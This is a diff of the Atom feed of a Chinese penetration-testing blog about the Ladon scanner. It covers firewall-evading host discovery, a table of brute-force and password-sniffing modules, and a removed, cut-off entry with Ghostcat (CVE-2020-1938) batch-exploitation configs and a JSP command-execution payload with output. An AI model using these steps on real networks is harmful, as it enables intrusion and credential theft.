@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-04-05T12:43:17.932Z</updated>
+  <updated>2020-04-06T10:31:51.596Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://k8gege.org/p/48225.html"/>
     <id>http://k8gege.org/p/48225.html</id>
     <published>2020-04-02T15:00:00.000Z</published>
-    <updated>2020-04-05T12:43:17.932Z</updated>
+    <updated>2020-04-06T10:31:51.596Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>内网渗透中，最重要的一步就是探测在线机器，只有先探测到机器<br>接下来才是探测操作系统、扫描端口服务、开放WEB、扫描漏洞等。<br>目标不开机，你搞啥呢？当然也有一种情况，目标开机但却扫不到<br>这是因为目前大部份扫描器使用PING扫描，而防火墙默认是拦截的<br>默认条件下也不放行其它端口，比如SMB、RDP、HTTP等协议也不行<br>那能不能在防火墙完全防护状态下探测存活机器呢？答案是有的。</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Win7-A: 192.168.1.20 测试防火墙<br>Win7-B: 192.168.1.7  Ladon扫描器</p><p>实验1：A机器关闭防火墙<br>实验2：A机器开启防火墙<br>实验3：A机器关机</p><p>PS：整个过程中B机器防火墙需关闭，因为要保证所有协议都能进出B机器<br>才能测试防火墙开启或关闭的情况下，分别有哪些协议可以探测存活主机</p><h3 id="A关闭防火墙"><a href="#A关闭防火墙" class="headerlink" title="A关闭防火墙"></a>A关闭防火墙</h3><p>ICMP协议可达目标机器，即可PING通A机器<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>=============================================<br>OnlinePC:5</p><h3 id="A开启防火墙"><a href="#A开启防火墙" class="headerlink" title="A开启防火墙"></a>A开启防火墙</h3><p>ICMP协议不可达目标机器，即无法PING通A机器，但是MAC可以<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br> MAC: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:6</p><h3 id="A机器关机"><a href="#A机器关机" class="headerlink" title="A机器关机"></a>A机器关机</h3><p>A机器关机后，发现无法探测MAC，说明能获取到MAC，机器肯定在线<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:5</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>开机状态下，开启系统防火墙后，无法PING通机器（默认配置）<br>但可获取远程机器MAC，因此可通过MAC探测目标主机是否存活</p><h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>1.有人问我Ladon扫描出来的存活机器，为何PING不通呢?是不是不准？<br>答：首先机器存活，但相关端口未开放，如3389没开,你当然连不上。<br>同理防火墙默认根本不允许ICMP协议通过，你PING不通很正常。Ladon<br>通过其它方式探测到存活，而非单纯的ICMP，PING不通并不代表关机<br>上面的实验结果已充分说明，用其它工具扫描可能会漏掉禁PING机器</p><p>2.有人问我为什么新版的OnlinePC比之前慢了，以前3秒可扫一个C段。<br>再重复一次，Ladon的OnlinePC不只是单纯的通过ICMP检测存活主机。<br>打个比方一个人自己开车去北京，中途车坏了他就不去了，事情结束<br>如果车坏了，找人来修或换乘轮船，最后到达北京时间是不是多了。<br>新版的先PING机器,不通并没有结束，而是再尝试使用其它协议探测<br>最简单的一个问题，你是想要扫描结果更准更多，还是结果少速度快<br>再者以前可能3秒至几秒，现在可能几秒至13秒，才多几秒钟也不慢啊</p><p>以上两个问题是我发此文章的主要原因，怕还会有很多人问同样的问题</p><h3 id="28种方法"><a href="#28种方法" class="headerlink" title="28种方法"></a>28种方法</h3><p>Ladon以下模块均可用于探测存活主机，不要死板的只用OnlinePC<br>或者只用其它只是用PING来扫描的工具，得到的结果错过很多机器<br>可根据实际情况使用以下模块探测存活主机，如WAF禁用HTTP协议<br>采用HTTP协议的模块就不要用了，即便同样是HTTP，模块结果不同<br>如WhatCMS识别到CMS才回显，WebScan还会返回HttpBanner。<br>所以同个协议，有些模块扫不出东西，不代表防火墙禁止该协议。</p><p>如大家最容易理解的扫445端口发现不开放，不代表TCP协议禁用<br>因为人家怕你用MS17010漏洞一键GETSHELL，所以禁止了共享而已<br>如果要精准探测存活主机，就得使用多个方式才能深入拓展内网</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>采用协议</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>OnlinePC</td><td>存活主机信息</td><td>ICMP、MAC、DNS</td><td>Ladon 192.168.1.1/24 OnlinePC</td></tr><tr><td>2</td><td>OnlineIP</td><td>存活主机(IP)</td><td>ICMP、MAC、DNS</td><td>Ladon 192.168.1.1/24 OnlineIP</td></tr><tr><td>3</td><td>UrlScan</td><td>URL域名扫描</td><td>HTTP</td><td>Ladon 192.168.1.1/24 UrlScan</td></tr><tr><td>4</td><td>SameWeb</td><td>同服域名扫描</td><td>HTTP</td><td>Ladon 192.168.1.1/24 SameWeb</td></tr><tr><td>5</td><td>WebScan</td><td>Web信息扫找</td><td>HTTP</td><td>Ladon 192.168.1.1/24 WebScan</td></tr><tr><td>6</td><td>HostIP</td><td>主机名解析</td><td>DNS</td><td>Ladon Win-K8gege HostIP</td></tr><tr><td>7</td><td>DomainIP</td><td>域名解析</td><td>DNS</td><td>Ladon k8gege.org DomainIP</td></tr><tr><td>8</td><td>OsScan</td><td>操作系统版本</td><td>MAC、DNS、SMB、HTTP、RDP、TCP等</td><td>Ladon 192.168.1.1/24 OsScan</td></tr><tr><td>9</td><td>PortScan</td><td>扫描Banner</td><td>TCP</td><td>Ladon 192.168.1.1/24 PortScan</td></tr><tr><td>10</td><td>WhatCMS</td><td>Web指纹识别</td><td>HTTP</td><td>Ladon 192.168.1.1/24 WhatCMS</td></tr><tr><td>11</td><td>CiscoScan</td><td>思科扫描</td><td>HTTP、TCP</td><td>Ladon 192.168.1.1/24 CiscoScan</td></tr><tr><td>12</td><td>EnumMssql</td><td>MSSQL主机</td><td>MSSQL</td><td>Ladon EnumMssql</td></tr><tr><td>13</td><td>EnumShare</td><td>共享主机</td><td>SMB</td><td>Ladon EnumShare</td></tr><tr><td>14</td><td>LdapScan</td><td>LDAP主机/389端口/密码爆破</td><td>LDAP、TCP</td><td>Ladon 192.168.1.1/24 LdapScan</td></tr><tr><td>15</td><td>FtpScan</td><td>FTP主机/21端口/密码爆破</td><td>FTP、TCP</td><td>Ladon 192.168.1.1/24 FtpScan</td></tr><tr><td>16</td><td>SmbScan</td><td>445端口/密码爆破</td><td>SMB、TCP</td><td>Ladon 192.168.1.1/24 SmbScan</td></tr><tr><td>17</td><td>WmiScan</td><td>135端口/密码爆破</td><td>WMI、TCP</td><td>Ladon 192.168.1.1/24 WmiScan</td></tr><tr><td>18</td><td>SmbHash</td><td>445端口/密码爆破</td><td>SMB、TCP</td><td>Ladon 192.168.1.1/24 SmbHash</td></tr><tr><td>19</td><td>WmiHash</td><td>135端口/密码爆破</td><td>WMI、TCP</td><td>Ladon 192.168.1.1/24 WmiHash</td></tr><tr><td>20</td><td>SshScan</td><td>22端口/密码爆破</td><td>SSH、TCP</td><td>Ladon 192.168.1.1/24 SshScan</td></tr><tr><td>21</td><td>MssqlScan</td><td>1433端口/密码爆破</td><td>MSSQL、TCP</td><td>Ladon 192.168.1.1/24 MssqlScan</td></tr><tr><td>22</td><td>OracleScan</td><td>1521端口/密码爆破</td><td>Oracle、TCP</td><td>Ladon 192.168.1.1/24 OracleScan</td></tr><tr><td>23</td><td>MysqlScan</td><td>3306端口/密码爆破</td><td>MYSQL、TCP</td><td>Ladon 192.168.1.1/24 MysqlScan</td></tr><tr><td>24</td><td>VncScan</td><td>5900端口/密码爆破</td><td>VNC、TCP</td><td>Ladon 192.168.1.1/24 VncScan</td></tr><tr><td>25</td><td>MS17010</td><td>MS17010漏洞检测</td><td>TCP、SMB</td><td>Ladon 192.168.1.1/24 MS17010</td></tr><tr><td>26</td><td>AdiDnsDump</td><td>域内存活机器</td><td>DNS、LDAP</td><td>Ladon AdiDnsDump 域机器IP</td></tr><tr><td>27</td><td>FtpSniffer</td><td>Ftp密码嗅探</td><td>FTP</td><td>Ladon FtpSniffer 192.168.1.8</td></tr><tr><td>28</td><td>HttpSniffer</td><td>HTTP密码嗅探</td><td>HTTP</td><td>Ladon HTTPSniffer 192.168.1.8</td></tr></tbody></table><p>PS: Ladon 6.2开始密码爆破模块，在无帐密文件的情况下，仅探测协议或对应端口<br>当然所有密码爆破均可自定义端口爆破，但自定义端口可能只支持一台不支持批量<br>具体看Ladon对应模块的详细文档,嗅探模块嗅探出HTTP或FTP帐密同时也证明其存活</p>]]></content>
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>内网渗透中，最重要的一步就是探测在线机器，只有先探测到机器<br>接下来才是探测操作系统、扫描端口服务、开放WEB、扫描漏洞等。<br>目标不开机，你搞啥呢？当然也有一种情况，目标开机但却扫不到<br>这是因为目前大部份扫描器使用PING扫描，而防火墙默认是拦截的<br>默认条件下也不放行其它端口，比如SMB、RDP、HTTP等协议也不行<br>那能不能在防火墙完全防护状态下探测存活机器呢？答案是有的。</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Win7-A: 192.168.1.20 测试防火墙<br>Win7-B: 192.168.1.7  Ladon扫描器</p><p>实验1：A机器关闭防火墙<br>实验2：A机器开启防火墙<br>实验3：A机器关机</p><p>PS：整个过程中B机器防火墙需关闭，因为要保证所有协议都能进出B机器<br>才能测试防火墙开启或关闭的情况下，分别有哪些协议可以探测存活主机</p><h3 id="A关闭防火墙"><a href="#A关闭防火墙" class="headerlink" title="A关闭防火墙"></a>A关闭防火墙</h3><p>ICMP协议可达目标机器，即可PING通A机器<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>=============================================<br>OnlinePC:5</p><h3 id="A开启防火墙"><a href="#A开启防火墙" class="headerlink" title="A开启防火墙"></a>A开启防火墙</h3><p>ICMP协议不可达目标机器，即无法PING通A机器，但是MAC可以<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br> MAC: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:6</p><h3 id="A机器关机"><a href="#A机器关机" class="headerlink" title="A机器关机"></a>A机器关机</h3><p>A机器关机后，发现无法探测MAC，说明能获取到MAC，机器肯定在线<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:5</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>开机状态下，开启系统防火墙后，无法PING通机器（默认配置）<br>但可获取远程机器MAC，因此可通过MAC探测目标主机是否存活</p><h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>1.有人问我Ladon扫描出来的存活机器，为何PING不通呢?是不是不准？<br>答：首先机器存活，但相关端口未开放，如3389没开,你当然连不上。<br>同理防火墙默认根本不允许ICMP协议通过，你PING不通很正常。Ladon<br>通过其它方式探测到存活，而非单纯的ICMP，PING不通并不代表关机<br>上面的实验结果已充分说明，用其它工具扫描可能会漏掉禁PING机器</p><p>2.有人问我为什么新版的OnlinePC比之前慢了，以前3秒可扫一个C段。<br>再重复一次，Ladon的OnlinePC不只是单纯的通过ICMP检测存活主机。<br>打个比方一个人自己开车去北京，中途车坏了他就不去了，事情结束<br>如果车坏了，找人来修或换乘轮船，最后到达北京时间是不是多了。<br>新版的先PING机器,不通并没有结束，而是再尝试使用其它协议探测<br>最简单的一个问题，你是想要扫描结果更准更多，还是结果少速度快<br>再者以前可能3秒至几秒，现在可能几秒至13秒，才多几秒钟也不慢啊</p><p>以上两个问题是我发此文章的主要原因，怕还会有很多人问同样的问题</p><h3 id="28种方法"><a href="#28种方法" class="headerlink" title="28种方法"></a>28种方法</h3><p>Ladon以下模块均可用于探测存活主机，不要死板的只用OnlinePC<br>或者只用其它只是用PING来扫描的工具，得到的结果错过很多机器<br>可根据实际情况使用以下模块探测存活主机，如WAF禁用HTTP协议<br>采用HTTP协议的模块就不要用了，即便同样是HTTP，模块结果不同<br>如WhatCMS识别到CMS才回显，WebScan还会返回HttpBanner。<br>所以同个协议，有些模块扫不出东西，不代表防火墙禁止该协议。</p><p>如大家最容易理解的扫445端口发现不开放，不代表TCP协议禁用<br>因为人家怕你用MS17010漏洞一键GETSHELL，所以禁止了共享而已<br>如果要精准探测存活主机，就得使用多个方式才能深入拓展内网</p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>采用协议</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>OnlinePC</td><td>存活主机信息</td><td>ICMP、MAC、DNS</td><td>Ladon 192.168.1.1/24 OnlinePC</td></tr><tr><td>2</td><td>OnlineIP</td><td>存活主机(IP)</td><td>ICMP、MAC、DNS</td><td>Ladon 192.168.1.1/24 OnlineIP</td></tr><tr><td>3</td><td>UrlScan</td><td>URL域名扫描</td><td>HTTP</td><td>Ladon 192.168.1.1/24 UrlScan</td></tr><tr><td>4</td><td>SameWeb</td><td>同服域名扫描</td><td>HTTP</td><td>Ladon 192.168.1.1/24 SameWeb</td></tr><tr><td>5</td><td>WebScan</td><td>Web信息扫找</td><td>HTTP</td><td>Ladon 192.168.1.1/24 WebScan</td></tr><tr><td>6</td><td>HostIP</td><td>主机名解析</td><td>DNS</td><td>Ladon Win-K8gege HostIP</td></tr><tr><td>7</td><td>DomainIP</td><td>域名解析</td><td>DNS</td><td>Ladon k8gege.org DomainIP</td></tr><tr><td>8</td><td>OsScan</td><td>操作系统版本</td><td>MAC、DNS、SMB、HTTP、RDP、TCP等</td><td>Ladon 192.168.1.1/24 OsScan</td></tr><tr><td>9</td><td>PortScan</td><td>扫描Banner</td><td>TCP</td><td>Ladon 192.168.1.1/24 PortScan</td></tr><tr><td>10</td><td>WhatCMS</td><td>Web指纹识别</td><td>HTTP</td><td>Ladon 192.168.1.1/24 WhatCMS</td></tr><tr><td>11</td><td>CiscoScan</td><td>思科扫描</td><td>HTTP、TCP</td><td>Ladon 192.168.1.1/24 CiscoScan</td></tr><tr><td>12</td><td>EnumMssql</td><td>MSSQL主机</td><td>MSSQL</td><td>Ladon EnumMssql</td></tr><tr><td>13</td><td>EnumShare</td><td>共享主机</td><td>SMB</td><td>Ladon EnumShare</td></tr><tr><td>14</td><td>LdapScan</td><td>LDAP主机/389端口/密码爆破</td><td>LDAP、TCP</td><td>Ladon 192.168.1.1/24 LdapScan</td></tr><tr><td>15</td><td>FtpScan</td><td>FTP主机/21端口/密码爆破</td><td>FTP、TCP</td><td>Ladon 192.168.1.1/24 FtpScan</td></tr><tr><td>16</td><td>SmbScan</td><td>445端口/密码爆破</td><td>SMB、TCP</td><td>Ladon 192.168.1.1/24 SmbScan</td></tr><tr><td>17</td><td>WmiScan</td><td>135端口/密码爆破</td><td>WMI、TCP</td><td>Ladon 192.168.1.1/24 WmiScan</td></tr><tr><td>18</td><td>SmbHash</td><td>445端口/密码爆破</td><td>SMB、TCP</td><td>Ladon 192.168.1.1/24 SmbHash</td></tr><tr><td>19</td><td>WmiHash</td><td>135端口/密码爆破</td><td>WMI、TCP</td><td>Ladon 192.168.1.1/24 WmiHash</td></tr><tr><td>20</td><td>SshScan</td><td>22端口/密码爆破</td><td>SSH、TCP</td><td>Ladon 192.168.1.1/24 SshScan</td></tr><tr><td>21</td><td>MssqlScan</td><td>1433端口/密码爆破</td><td>MSSQL、TCP</td><td>Ladon 192.168.1.1/24 MssqlScan</td></tr><tr><td>22</td><td>OracleScan</td><td>1521端口/密码爆破</td><td>Oracle、TCP</td><td>Ladon 192.168.1.1/24 OracleScan</td></tr><tr><td>23</td><td>MysqlScan</td><td>3306端口/密码爆破</td><td>MYSQL、TCP</td><td>Ladon 192.168.1.1/24 MysqlScan</td></tr><tr><td>24</td><td>VncScan</td><td>5900端口/密码爆破</td><td>VNC、TCP</td><td>Ladon 192.168.1.1/24 VncScan</td></tr><tr><td>25</td><td>MS17010</td><td>MS17010漏洞检测</td><td>TCP、SMB</td><td>Ladon 192.168.1.1/24 MS17010</td></tr><tr><td>26</td><td>AdiDnsDump</td><td>域内存活机器</td><td>DNS、LDAP</td><td>Ladon AdiDnsDump 域机器IP</td></tr><tr><td>27</td><td>FtpSniffer</td><td>Ftp密码嗅探</td><td>FTP</td><td>Ladon FtpSniffer 192.168.1.8</td></tr><tr><td>28</td><td>HttpSniffer</td><td>HTTP密码嗅探</td><td>HTTP</td><td>Ladon HTTPSniffer 192.168.1.8</td></tr></tbody></table><p>PS: Ladon 6.2开始密码爆破模块，在无帐密文件的情况下，仅探测协议或对应端口<br>当然所有密码爆破均可自定义端口爆破，但自定义端口可能只支持一台不支持批量<br>具体看Ladon对应模块的详细文档,嗅探模块嗅探出HTTP或FTP帐密同时也证明其存活</p><h3 id="Browser协议"><a href="#Browser协议" class="headerlink" title="Browser协议"></a>Browser协议</h3><p>无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2-12分钟<br>除了上述方法外，Browser协议也可以用于探测存活主机，不过是基于嗅探<br>基于Browser协议探测内网主机，详见：<a href="http://k8gege.org/p/16b5ff0b.html">http://k8gege.org/p/16b5ff0b.html</a></p>]]></content>
     
     <summary type="html">
     
@@ -61,16 +61,16 @@
     </summary>
     
     
-      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
-    
       <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
     
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
+      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
     
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="Kali" scheme="http://k8gege.org/tags/Kali/"/>
     
@@ -105,9 +105,9 @@
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
     
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="Kali" scheme="http://k8gege.org/tags/Kali/"/>
     
@@ -134,14 +134,14 @@
     </summary>
     
     
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
       <category term="Cobalt Strike" scheme="http://k8gege.org/categories/Cobalt-Strike/"/>
     
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="Cobalt Strike" scheme="http://k8gege.org/tags/Cobalt-Strike/"/>
     
@@ -191,20 +191,20 @@
     
       <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
     
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
       <category term="Cobalt Strike" scheme="http://k8gege.org/categories/Cobalt-Strike/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
       <category term="内网" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/"/>
     
     
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
+      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
+    
       <category term="Code" scheme="http://k8gege.org/tags/Code/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
   </entry>
   
@@ -235,9 +235,9 @@
     
       <category term="源码" scheme="http://k8gege.org/categories/%E6%BA%90%E7%A0%81/"/>
     
-      <category term="SQL" scheme="http://k8gege.org/categories/SQL/"/>
-    
       <category term="编程" scheme="http://k8gege.org/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="SQL" scheme="http://k8gege.org/categories/SQL/"/>
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
@@ -267,16 +267,16 @@
     </summary>
     
     
-      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
       <category term="提权" scheme="http://k8gege.org/categories/%E6%8F%90%E6%9D%83/"/>
     
+      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
     
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
     
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
+    
+      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
     
   </entry>
   
@@ -301,18 +301,18 @@
     
       <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
     
-      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+      <category term="密码" scheme="http://k8gege.org/categories/%E5%AF%86%E7%A0%81/"/>
     
       <category term="内网" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/"/>
     
       <category term="嗅探" scheme="http://k8gege.org/categories/%E5%97%85%E6%8E%A2/"/>
     
     
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="Sniffer" scheme="http://k8gege.org/tags/Sniffer/"/>
     
@@ -367,34 +367,6 @@
   </entry>
   
   <entry>
-    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
-    <link href="http://k8gege.org/p/42879.html"/>
-    <id>http://k8gege.org/p/42879.html</id>
-    <published>2020-03-28T03:39:45.663Z</published>
-    <updated>2020-03-30T03:04:56.043Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p><h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p><h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p><h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p><h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure><h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure><p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p><h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p><h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p><h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" 